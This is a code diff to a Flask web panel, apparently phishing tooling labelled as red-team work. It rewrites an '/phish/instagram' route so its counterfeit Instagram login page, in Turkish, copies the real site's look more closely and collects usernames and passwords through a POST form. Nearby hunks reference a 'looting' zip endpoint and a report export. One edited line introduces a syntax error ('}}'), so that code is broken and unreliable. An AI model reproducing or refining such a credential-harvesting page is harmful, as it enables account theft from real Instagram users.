@@ -90,7 +90,7 @@ HTML_TEMPLATE = """
         .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
         label { color: #38bdf8; font-size: 13px; font-weight: bold; }
         input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
-        input:focus, textareaFocus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
+        input:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
         textarea { resize: vertical; height: 100px; }
         button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
         button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
@@ -496,7 +496,7 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
-# --- INSTAGRAM PHISHING ROTE ---
+# --- İNSTAGRAM PHISHING ROTA (BİREBİR ORİJİNAL GÖRÜNÜM) ---
 @app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
     if request.method == "POST":
@@ -520,23 +520,62 @@ def insta_phish():
         <meta charset="UTF-8">
         <title>Giriş • Instagram</title>
         <style>
-            body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 320px; text-align: center; border-radius: 1px; }
-            h1 { font-family: cursive; margin-bottom: 30px; font-size: 32px; font-weight: normal; }
-            input { width: 100%; padding: 10px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; outline: none; }
+            body { background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .wrapper { display: flex; max-width: 935px; width: 100%; justify-content: center; align-items: center; }
+            .left-side { margin-right: 32px; display: flex; flex-direction: column; align-items: flex-start; }
+            .right-side { width: 350px; display: flex; flex-direction: column; }
+            .login-card { background: #ffffff; border: 1px solid #dbdbdb; padding: 30px 40px; text-align: center; border-radius: 1px; margin-bottom: 10px; }
+            .logo-header { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; }
+            .logo-header h1 { font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 24px; font-weight: 500; margin: 0; color: #262626; }
+            .insta-icon { width: 28px; height: 28px; background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); border-radius: 8px; }
+            .tagline { font-size: 32px; line-height: 40px; font-weight: 600; color: #262626; max-width: 400px; margin-bottom: 20px; }
+            .tagline span { background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+            input { width: 100%; padding: 10px 12px; margin-bottom: 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; outline: none; }
             input:focus { border-color: #a8a8a8; }
-            button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 14px; }
-            button:hover { background: #1877f2; }
+            button[type="submit"] { width: 100%; background: #0095f6; color: white; border: none; padding: 9px; border-radius: 8px; font-weight: 600; margin-top: 8px; cursor: pointer; font-size: 14px; }
+            button[type="submit"]:hover { background: #1877f2; }
+            .divider { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+            .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+            .divider::before { margin-right: 18px; }
+            .divider::after { margin-left: 18px; }
+            .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; margin-bottom: 20px; }
+            .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; }
+            .signup-card { background: #ffffff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; border-radius: 1px; font-size: 14px; color: #262626; }
+            .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
+            .meta-footer { text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 12px; font-weight: 600; letter-spacing: 1px; }
         </style>
     </head>
     <body>
-        <div class="login-card">
-            <h1>Instagram</h1>
-            <form method="POST">
-                <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
-                <input type="password" name="password" placeholder="Şifre" required>
-                <button type="submit">Giriş Yap</button>
-            </form>
+        <div class="wrapper">
+            <div class="left-side">
+                <div class="tagline"><span>Yakın arkadaşlarının</span> günlük anlarını gör.</div>
+                <img src="https://i.ibb.co/3s6qjLq/insta-mockup.png" style="width: 320px; display:none;" alt="">
+            </div>
+            <div class="right-side">
+                <div class="login-card">
+                    <div class="logo-header">
+                        <div class="insta-icon"></div>
+                        <h1>Instagram</h1>
+                    </div>
+                    <form method="POST">
+                        <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                        <input type="password" name="password" placeholder="Şifre" required>
+                        <button type="submit">Giriş Yap</button>
+                    </form>
+                    <div class="divider">YA DA</div>
+                    <a href="#" class="fb-login">
+                        <svg width="16" height="16" fill="#385185" viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z"/></svg>
+                        Facebook ile giriş yap
+                    </a>
+                    <a href="#" class="forgot-pass">Şifreni mi unuttun?</a>
+                </div>
+                <div class="signup-card">
+                    Hesabın yok mu? <a href="#">Kaydol</a>
+                </div>
+                <div class="meta-footer">
+                    <p style="margin: 0; font-size: 14px; font-weight: normal;">infinita Meta</p>
+                </div>
+            </div>
         </div>
     </body>
     </html>
@@ -770,7 +809,7 @@ def api_looting_zip():
 
 @app.route("/api/download-pdf")
 def api_download_pdf():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}}, 401
     pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
     pdf.multi_cell(0, 5, "Red Team Report")
     return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')
